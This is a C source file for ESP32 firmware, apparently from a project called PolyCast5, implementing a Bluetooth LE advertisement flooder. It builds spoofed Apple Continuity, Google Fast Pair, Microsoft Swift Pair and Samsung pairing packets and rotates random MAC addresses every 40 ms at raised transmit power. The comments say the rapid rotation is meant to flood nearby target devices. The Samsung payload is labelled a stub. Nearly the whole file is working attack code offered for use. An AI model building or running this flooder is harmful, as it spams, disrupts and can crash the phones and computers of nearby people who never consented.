#include <string.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_err.h"
#include "esp_random.h"
#include "esp_bt.h"                      // esp_bt_controller_get_status

#include "nimble/nimble_port.h"          // nimble_port_init/deinit/run/stop
#include "nimble/nimble_port_freertos.h" // esp_nimble_enable, nimble_port_freertos_deinit
#include "nimble/ble.h"                  // BLE_OWN_ADDR_RANDOM, BLE_ERR_REM_USER_CONN_TERM
#include "host/ble_hs.h"                 // ble_hs_cfg, BLE_HS_FOREVER
#include "host/ble_hs_id.h"              // ble_hs_id_set_rnd
#include "host/ble_gap.h"

#include "polycast5_macros.h"
#include "bluetooth_utils.h"             // bluetooth_state_t / bluetooth_state
#include "ble_flood.h"

#define TAG "BLE_FLOOD"

// Advertising TX power: This build's controller default is +12 dBm (CONFIG_BT_LE_DFT_TX_POWER_LEVEL_P12);
#define BLE_FLOOD_TX_PWR_LVL ESP_PWR_LVL_P20

// Advertising cadence: Matches what effective flooders use
#define BLE_FLOOD_ADV_ITVL_MIN_MS 20 // Advertising interval floor (ms) - 20 ms == 0x20
#define BLE_FLOOD_ADV_ITVL_MAX_MS 30 // Advertising interval ceiling (ms)
#define BLE_FLOOD_DWELL_MS        40 // On-air time per identity before rotating (ms)

// Owned by bluetooth_utils.c; used only to refuse starting while HID BT is up.
extern volatile bluetooth_state_t bluetooth_state;

// Module state (single worker, serialized by the start/stop guards)
static volatile bool     s_active   = false; // true from start() until teardown done
static volatile bool     s_synced   = false; // controller sync fired
static volatile bool     s_stop_req = false; // stop() requested
static volatile uint32_t s_count    = 0;     // adverts sent this run
static TaskHandle_t      s_worker   = NULL;
static ble_flood_mode_t  s_mode     = BLE_FLOOD_MODE_ALL;

bool     ble_flood_is_active(void) { return s_active; }
uint32_t ble_flood_get_count(void) { return s_count; }

/* ===================== NimBLE host plumbing ===================== */

static void ble_flood_on_sync(void)   { s_synced = true; }
static void ble_flood_on_reset(int r) { s_synced = false; ESP_LOGW(TAG, "host reset; reason=%d", r); }

static void ble_flood_host_task(void *arg)
{
    // Blocks until nimble_port_stop() is called from the worker task
    nimble_port_run();

    // nimble_port_freertos_deinit() -> vTaskDelete(self); nothing after runs
    nimble_port_freertos_deinit();
}

// Connectable adverts (Fast Pair / Swift Pair) inherit this callback.
// Drop any incoming connection immediately so it can't park on a connection slot and stall advertising.
static int ble_flood_gap_event(struct ble_gap_event *event, void *arg)
{
    if (event->type == BLE_GAP_EVENT_CONNECT && event->connect.status == 0) {
        ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }
    return 0;
}

/* ===================== Address ===================== */

// Fill a random static-random address.
// NimBLE addresses are little-endian, so a[5] is the MSB; the top two bits must be 0b11 to mark it static-random.
static void gen_static_random_addr(uint8_t a[6])
{
    esp_fill_random(a, 6);
    a[5] |= 0xC0;
}

/* ===================== Payload builders =====================
 * Each fills buf (<= 31 bytes) and returns the length; *connectable selects the
 * advertising type. See the on-air-verification note at the top of this file. */

// (a) Apple Continuity - Proximity Pairing (type 0x07) 31-byte packet
static const uint16_t APPLE_PP_MODELS[] = {
    0x0220, // AirPods (1st gen)
    0x0F20, // AirPods (2nd gen)
    0x1320, // AirPods (3rd gen)
    0x0E20, // AirPods Pro
    0x1420, // AirPods Pro (2nd gen)
    0x0A20, // AirPods Max
    0x0320, // Powerbeats 3
    0x0B20, // Powerbeats Pro
    0x0C20, // Beats Solo Pro
    0x1120, // Beats Studio Buds
    0x1020, // Beats Flex
    0x0520, // BeatsX
    0x0620, // Beats Solo 3
    0x0920, // Beats Studio 3
    0x1720, // Beats Studio Buds+
    0x1220, // Beats Fit Pro
};

static int build_apple_proximity(uint8_t buf[31])
{
    uint16_t model = APPLE_PP_MODELS[esp_random() % (sizeof(APPLE_PP_MODELS) / sizeof(APPLE_PP_MODELS[0]))];
    int i = 0;
    buf[i++] = 0x1E;                    // AD length = 30
    buf[i++] = 0xFF;                    // Manufacturer Specific Data
    buf[i++] = 0x4C; buf[i++] = 0x00;   // Company 0x004C = Apple (LE)
    buf[i++] = 0x07;                    // Continuity type: Proximity Pairing
    buf[i++] = 0x19;                    // Continuity length = 25
    buf[i++] = 0x07;                    // prefix (0x07 pairing / 0x01 "new device")
    buf[i++] = (model >> 8) & 0xFF;     // model high byte
    buf[i++] = (model >> 0) & 0xFF;     // model low byte
    buf[i++] = 0x55;                    // status
    buf[i++] = (esp_random() & 0x7F) | 0x40; // L/R + case battery (illustrative)
    buf[i++] = esp_random() & 0xFF;     // case battery / charging flags
    buf[i++] = esp_random() & 0xFF;     // lid open counter
    buf[i++] = 0x00;                    // device color
    buf[i++] = 0x00;
    while (i < 31) buf[i++] = esp_random() & 0xFF;  // 16-byte encrypted-ish tail
    return 31;
}

// (b) Apple Continuity - Nearby Action (type 0x0F)
static const uint8_t APPLE_NA_ACTIONS[] = {
    0x27, // AppleTV Setup
    0x20, // Join This AppleTV
    0x09, // Setup New Device
    0x0B, // HomePod Setup
    0x0D, // Transfer Wi-Fi Password
    0x2B, // HomePod Setup (alt)
    0x1E, // Apple ID for AppleTV
    0x13, // AppleTV AutoFill
};

static int build_apple_nearby(uint8_t buf[31])
{
    uint8_t action = APPLE_NA_ACTIONS[esp_random() % sizeof(APPLE_NA_ACTIONS)];
    int i = 0;
    buf[i++] = 0x0A;                    // AD length = 10
    buf[i++] = 0xFF;                    // Manufacturer Specific Data
    buf[i++] = 0x4C; buf[i++] = 0x00;   // Apple
    buf[i++] = 0x0F;                    // Continuity type: Nearby Action
    buf[i++] = 0x05;                    // Continuity length = 5
    buf[i++] = 0xC0;                    // action flags
    buf[i++] = action;
    buf[i++] = esp_random() & 0xFF;     // 3 auth/random bytes
    buf[i++] = esp_random() & 0xFF;
    buf[i++] = esp_random() & 0xFF;
    return i;                           // 11 bytes
}

// (c) Google Fast Pair - service data 0xFE2C + 3-byte model ID (connectable)
static const uint32_t FASTPAIR_MODELS[] = {  // 24-bit model IDs
    0xCD8256, // Bose QC 35 II
    0x0489B9, // Pixel Buds
    0x92BBBD,
    0x821F66,
    0xF52494,
    0x718FA4,
    0xD446A7,
    0x2D7A23,
    0x0000F0, // generic / debug (triggers "device scanning" style notice)
};

static int build_fastpair(uint8_t buf[31])
{
    uint32_t id = FASTPAIR_MODELS[esp_random() % (sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]))];
    int i = 0;
    buf[i++] = 0x02; buf[i++] = 0x01; buf[i++] = 0x06;                  // Flags: LE General + BR/EDR N/A
    buf[i++] = 0x03; buf[i++] = 0x03; buf[i++] = 0x2C; buf[i++] = 0xFE; // Complete 16-bit UUIDs: 0xFE2C
    buf[i++] = 0x06;                  // Service Data length = 6
    buf[i++] = 0x16;                  // AD type: Service Data - 16-bit UUID
    buf[i++] = 0x2C; buf[i++] = 0xFE; // UUID 0xFE2C (LE)
    buf[i++] = (id >> 16) & 0xFF;     // model ID (big-endian, 3 bytes)
    buf[i++] = (id >> 8) & 0xFF;
    buf[i++] = (id >> 0) & 0xFF;
    buf[i++] = 0x02; buf[i++] = 0x0A; buf[i++] = 0x00; // Tx power (optional)
    return i;                                          // 17 bytes
}

// (d) Microsoft Swift Pair - manufacturer 0x0006 (connectable)
static const char *SWIFT_NAMES[] = { "PolyCast", "Surface Buds", "MX Keys", "BLE Test" };

static int build_swiftpair(uint8_t buf[31])
{
    const char *name = SWIFT_NAMES[esp_random() % (sizeof(SWIFT_NAMES) / sizeof(SWIFT_NAMES[0]))];
    uint8_t nlen = (uint8_t)strlen(name);
    if (nlen > 24) nlen = 24;           // 7 header bytes + name must be <= 31
    int i = 0;
    buf[i++] = 6 + nlen;                // AD length
    buf[i++] = 0xFF;                    // Manufacturer Specific Data
    buf[i++] = 0x06; buf[i++] = 0x00;  // Company 0x0006 = Microsoft (LE)
    buf[i++] = 0x03;                    // Microsoft Beacon ID / scenario = Swift Pair
    buf[i++] = 0x00;                    // sub-scenario
    buf[i++] = 0x80;                    // reserved / RSSI
    memcpy(&buf[i], name, nlen); i += nlen;
    return i;
}

// (e) Samsung - manufacturer 0x0075 (STUB: transcribe the real layout from a
// reference before relying on it; kept valid-but-inert for now).
static int build_samsung(uint8_t buf[31])
{
    int i = 0;
    buf[i++] = 0x0F;                    // AD length = 15
    buf[i++] = 0xFF;                    // Manufacturer Specific Data
    buf[i++] = 0x75; buf[i++] = 0x00;  // Company 0x0075 = Samsung (LE)
    for (int n = 0; n < 12; n++) buf[i++] = esp_random() & 0xFF;
    return i;
}

// Pick a builder; BLE_FLOOD_MODE_ALL rotates one at random per packet
static int build_payload(ble_flood_mode_t mode, uint8_t buf[31], bool *connectable)
{
    ble_flood_mode_t m = mode;
    if (m == BLE_FLOOD_MODE_ALL) m = (ble_flood_mode_t)(esp_random() % BLE_FLOOD_MODE_ALL);

    switch (m) {
        case BLE_FLOOD_MODE_FASTPAIR:  *connectable = true;  return build_fastpair(buf);
        case BLE_FLOOD_MODE_SWIFTPAIR: *connectable = true;  return build_swiftpair(buf);
        case BLE_FLOOD_MODE_SAMSUNG:   *connectable = false; return build_samsung(buf);
        case BLE_FLOOD_MODE_APPLE:
        default:
            *connectable = false;
            return (esp_random() & 1) ? build_apple_proximity(buf) : build_apple_nearby(buf);
    }
}

/* ===================== Worker task ===================== */

static void ble_flood_task(void *arg)
{
    // Bring up an advertise-only NimBLE stack
    if (nimble_port_init() != ESP_OK) {
        ESP_LOGE(TAG, "nimble_port_init failed");
        goto done;
    }

    ble_hs_cfg.sync_cb  = ble_flood_on_sync;
    ble_hs_cfg.reset_cb = ble_flood_on_reset;
    s_synced = false;

    if (esp_nimble_enable(ble_flood_host_task) != ESP_OK) {
        ESP_LOGE(TAG, "esp_nimble_enable failed");
        nimble_port_deinit(); // host task never started; no stop needed
        goto done;
    }

    // Wait for controller sync (~2 s max)
    for (int t = 0; !s_synced && t < 200; t++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (!s_synced) {
        ESP_LOGE(TAG, "controller never synced");
        goto teardown;
    }

    // Crank advertising TX power for maximum range (controller default is +12 dBm here)
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_FLOOD_TX_PWR_LVL);

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "flood running, mode=%d", s_mode);
#endif

    // Rotate loop: new MAC + payload every packet
    while (!s_stop_req) {
        uint8_t addr[6];
        uint8_t buf[31];
        bool connectable = false;
        int len = build_payload(s_mode, buf, &connectable);

        ble_gap_adv_stop(); // BLE_HS_EALREADY if not advertising - ignore

        gen_static_random_addr(addr);
        int rc = ble_hs_id_set_rnd(addr);
        if (rc != 0) {
            ESP_LOGW(TAG, "ble_hs_id_set_rnd rc=%d", rc);
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        rc = ble_gap_adv_set_data(buf, len);
        if (rc != 0) {
            ESP_LOGW(TAG, "ble_gap_adv_set_data rc=%d", rc);
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        struct ble_gap_adv_params p = {0};
        p.disc_mode = BLE_GAP_DISC_MODE_GEN;
        p.conn_mode = connectable ? BLE_GAP_CONN_MODE_UND : BLE_GAP_CONN_MODE_NON;
        p.itvl_min  = BLE_GAP_ADV_ITVL_MS(BLE_FLOOD_ADV_ITVL_MIN_MS);
        p.itvl_max  = BLE_GAP_ADV_ITVL_MS(BLE_FLOOD_ADV_ITVL_MAX_MS);

        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &p, ble_flood_gap_event, NULL);
        if (rc != 0) {
            ESP_LOGW(TAG, "ble_gap_adv_start rc=%d", rc);
        } else {
            s_count++;
        }

        // Brief dwell (~1-2 advertising events), then rotate MAC + payload - fast
        // rotation across many distinct identities is what floods the target. 1 tick = 10 ms.
        vTaskDelay(pdMS_TO_TICKS(BLE_FLOOD_DWELL_MS));
    }

teardown:
    ble_gap_adv_stop();
    nimble_port_stop(); // blocks; host task returns and self-deletes
    nimble_port_deinit(); // single safe ble_gatts_stop + controller deinit

done:
    s_active = false;
    s_worker = NULL;
#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "flood stopped (sent %" PRIu32 ")", s_count);
#endif
    vTaskDelete(NULL);
}

/* ===================== Public API ===================== */

esp_err_t ble_flood_start(ble_flood_mode_t mode)
{
    if (mode >= BLE_FLOOD_MODE_MAX) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_active) {
        return ESP_ERR_INVALID_STATE;
    }
    if (bluetooth_state != BT_STATE_OFF) {
        ESP_LOGE(TAG, "Refusing flood: HID Bluetooth is up (state=%d)", bluetooth_state);
        return ESP_ERR_INVALID_STATE;
    }
    if (esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_IDLE) {
        ESP_LOGE(TAG, "Refusing flood: BT controller not idle");
        return ESP_ERR_INVALID_STATE;
    }

    s_mode     = mode;
    s_stop_req = false;
    s_count    = 0;
    s_active   = true;

    if (xTaskCreate(ble_flood_task, "ble_flood", 1024 * 4, NULL, POLYCAST5_PRIORITY_MEDIUM, &s_worker) != pdPASS) {
        s_active = false;
        s_worker = NULL;
        ESP_LOGE(TAG, "Failed to start ble_flood task");
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t ble_flood_stop(void)
{
    // Non-blocking: the worker tears down and self-deletes
    // ble_flood_is_active() reports false once teardown completes; the start guard handles re-entry.
    s_stop_req = true;
    return ESP_OK;
}
